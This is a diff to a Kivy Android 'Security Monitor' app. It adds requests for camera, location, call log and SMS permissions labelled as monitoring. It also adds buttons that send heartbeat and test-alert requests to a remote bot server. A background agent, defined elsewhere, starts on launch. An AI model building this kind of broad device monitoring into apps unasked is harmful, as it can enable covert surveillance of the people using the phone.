@@ -8,16 +8,69 @@ from kivy.clock import Clock
 from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.button import Button
 from kivy.uix.label import Label
+from kivy.utils import platform
+
 
 from config_builtin import BOT_URL, API_KEY, AGENT_ID
 from main_service import run_agent
 
 
+# ===============================
+# ANDROID PERMISSIONS
+# ===============================
+
+if platform == "android":
+
+    from android.permissions import (
+        request_permissions,
+        Permission
+    )
+
+
+def request_android_permissions():
+
+    if platform == "android":
+
+        request_permissions([
+
+            # Camera monitoring
+            Permission.CAMERA,
+
+            # Location monitoring
+            Permission.ACCESS_FINE_LOCATION,
+            Permission.ACCESS_COARSE_LOCATION,
+
+            # Call monitoring
+            Permission.READ_CALL_LOG,
+            Permission.READ_PHONE_STATE,
+
+            # SMS monitoring
+            Permission.READ_SMS,
+            Permission.RECEIVE_SMS,
+
+            # Android 13 notification
+            Permission.POST_NOTIFICATIONS,
+
+        ])
+
+
+# ===============================
+# AGENT CONFIG
+# ===============================
+
 class AgentConfig:
+
     bot_url = BOT_URL
+
     api_key = API_KEY
+
     agent_id = AGENT_ID
 
+
+
+# ===============================
+# UI
+# ===============================
 
 class MonitorUI(BoxLayout):
 
@@ -30,38 +83,62 @@ class MonitorUI(BoxLayout):
             **kwargs
         )
 
+
         self.status_label = Label(
+
             text="Security Monitor\nReady",
+
             font_size="22sp",
+
         )
 
-        self.add_widget(self.status_label)
+        self.add_widget(
+            self.status_label
+        )
 
 
-        # Heartbeat test button
+
         self.test_button = Button(
+
             text="Test Render Connection",
+
             size_hint_y=0.25,
+
         )
+
 
         self.test_button.bind(
+
             on_press=self.test_connection
+
         )
 
-        self.add_widget(self.test_button)
+
+        self.add_widget(
+            self.test_button
+        )
 
 
-        # Alert test button
+
         self.alert_button = Button(
+
             text="Send Test Alert",
+
             size_hint_y=0.25,
+
         )
+
 
         self.alert_button.bind(
+
             on_press=self.send_test_alert
+
         )
 
-        self.add_widget(self.alert_button)
+
+        self.add_widget(
+            self.alert_button
+        )
 
 
 
@@ -85,8 +162,11 @@ class MonitorUI(BoxLayout):
 
 
         threading.Thread(
+
             target=self._connection_worker,
+
             daemon=True
+
         ).start()
 
 
@@ -103,11 +183,17 @@ class MonitorUI(BoxLayout):
                 f"{BOT_URL.rstrip('/')}/agent/heartbeat",
 
                 json={
+
                     "device_info": {
+
                         "platform": "android",
+
                         "status": "APK heartbeat test"
+
                     }
+
                 },
+
 
                 headers={
 
@@ -119,29 +205,40 @@ class MonitorUI(BoxLayout):
 
                 },
 
+
                 timeout=20
+
             )
 
 
             message = (
+
                 f"Heartbeat:\n"
+
                 f"HTTP {response.status_code}\n"
+
                 f"{response.text[:200]}"
+
             )
 
 
         except Exception:
 
             message = (
+
                 "Heartbeat failed:\n"
+
                 +
+
                 traceback.format_exc()[-700:]
+
             )
 
 
         Clock.schedule_once(
 
             lambda dt:
+
             self.finish_test(message),
 
             0
@@ -157,6 +254,7 @@ class MonitorUI(BoxLayout):
     def send_test_alert(self, _instance=None):
 
         self.alert_button.disabled = True
+
 
         self.set_status(
             "Sending alert..."
@@ -184,14 +282,20 @@ class MonitorUI(BoxLayout):
 
                 f"{BOT_URL.rstrip('/')}/alert",
 
+
                 json={
 
-                    "title": "APK Test Alert",
+                    "title":
+                    "APK Test Alert",
+
 
                     "description":
                     "Security Monitor test alert from Android",
 
-                    "severity": "HIGH",
+
+                    "severity":
+                    "HIGH",
+
 
                     "device_info": {
 
@@ -203,6 +307,7 @@ class MonitorUI(BoxLayout):
 
                 },
 
+
                 headers={
 
                     "X-API-Key": API_KEY,
@@ -212,6 +317,7 @@ class MonitorUI(BoxLayout):
                     "Content-Type": "application/json"
 
                 },
+
 
                 timeout=20
 
@@ -245,6 +351,7 @@ class MonitorUI(BoxLayout):
         Clock.schedule_once(
 
             lambda dt:
+
             self.finish_alert(message),
 
             0
@@ -270,13 +377,22 @@ class MonitorUI(BoxLayout):
 
 
 
+# ===============================
+# APP
+# ===============================
 
 class SecurityMonitorApp(App):
 
 
     def build(self):
 
-        # Start background monitoring agent
+        # Request Android permissions
+
+        request_android_permissions()
+
+
+
+        # Start security monitoring
 
         threading.Thread(
 
@@ -285,6 +401,7 @@ class SecurityMonitorApp(App):
             daemon=True
 
         ).start()
+
 
 
         return MonitorUI()
@@ -300,6 +417,7 @@ class SecurityMonitorApp(App):
                 AgentConfig()
 
             )
+
 
         except Exception:
 
